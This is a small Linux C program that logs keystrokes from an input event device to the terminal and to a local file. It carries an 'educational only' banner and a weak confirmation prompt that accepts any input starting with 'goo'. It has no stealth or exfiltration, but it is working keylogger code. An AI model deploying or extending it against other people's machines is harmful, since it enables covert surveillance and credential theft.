#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>
#include <time.h>
#include <signal.h>
#include <stdlib.h>
#include <errno.h>

typedef struct {
    char device[64];
    int fd;
    FILE *log;
} Logger;

static Logger L = { .fd = -1, .log = NULL };

static const char *simple_key(unsigned int c) {
    switch (c) {
        case KEY_A: return "A"; case KEY_B: return "B"; case KEY_C: return "C";
        case KEY_D: return "D"; case KEY_E: return "E"; case KEY_F: return "F";
        case KEY_G: return "G"; case KEY_H: return "H"; case KEY_I: return "I";
        case KEY_J: return "J"; case KEY_K: return "K"; case KEY_L: return "L";
        case KEY_M: return "M"; case KEY_N: return "N"; case KEY_O: return "O";
        case KEY_P: return "P"; case KEY_Q: return "Q"; case KEY_R: return "R";
        case KEY_S: return "S"; case KEY_T: return "T"; case KEY_U: return "U";
        case KEY_V: return "V"; case KEY_W: return "W"; case KEY_X: return "X";
        case KEY_Y: return "Y"; case KEY_Z: return "Z";
        case KEY_SPACE: return "SPACE";
        case KEY_ENTER: return "ENTER";
        case KEY_BACKSPACE: return "BACKSPACE";
        case KEY_TAB: return "TAB";
        case KEY_ESC: return "ESC";
        default: return NULL;
    }
}

static void ts(char *buf, size_t n) {
    time_t t = time(NULL);
    struct tm tm;
    localtime_r(&t, &tm);
    strftime(buf, n, "%F %T", &tm);
}

static void cleanup_and_exit(int code) {
    if (L.log) { fflush(L.log); fclose(L.log); L.log = NULL; }
    if (L.fd >= 0) { close(L.fd); L.fd = -1; }
    if (code == 0) printf("bye — cleaned up.\n");
    exit(code);
}

static void sigint(int s) {
    (void)s;
    fprintf(stderr, "\nSIGINT received, exiting...\n");
    cleanup_and_exit(0);
}

int main(int argc, char **argv) {
    if (argc != 2) {
        fprintf(stderr, "usage: %s /dev/input/eventX\n", argv[0]);
        return 1;
    }

    printf("logger — educational only. Run on machines you own or in a VM.\n");
    printf("Type 'goober' to confirm and proceed: ");
    char ans[16];
    if (!fgets(ans, sizeof(ans), stdin)) return 1;
    if (strncmp(ans, "goober", 3) != 0) { printf("aborting.\n"); return 1; }

    strncpy(L.device, argv[1], sizeof(L.device)-1);
    L.fd = open(L.device, O_RDONLY);
    if (L.fd < 0) { perror("open"); return 1; }

    L.log = fopen("keystrokes.log", "a");
    if (!L.log) { perror("fopen"); close(L.fd); return 1; }

    signal(SIGINT, sigint);
    printf("logging... press Ctrl+C to stop. output: ./keystrokes.log\n");

    struct input_event ev;
    while (1) {
        ssize_t r = read(L.fd, &ev, sizeof(ev));
        if (r == (ssize_t)sizeof(ev)) {
            if (ev.type == EV_KEY && (ev.value == 1 || ev.value == 2)) {
                char timebuf[64];
                ts(timebuf, sizeof(timebuf));
                const char *kn = simple_key(ev.code);
                if (kn) {
                    printf("[%s] %s\n", timebuf, kn);
                    fprintf(L.log, "[%s] %s\n", timebuf, kn);
                } else {
                    printf("[%s] code %u\n", timebuf, ev.code);
                    fprintf(L.log, "[%s] code %u\n", timebuf, ev.code);
                }
                fflush(L.log);
            }
        } else if (r < 0) {
            if (errno == EINTR) continue;
            perror("read");
            break;
        } else {
            fprintf(stderr, "ayy goober, device closed?\n");
            break;
        }
    }

    cleanup_and_exit(0);
    return 0;
}

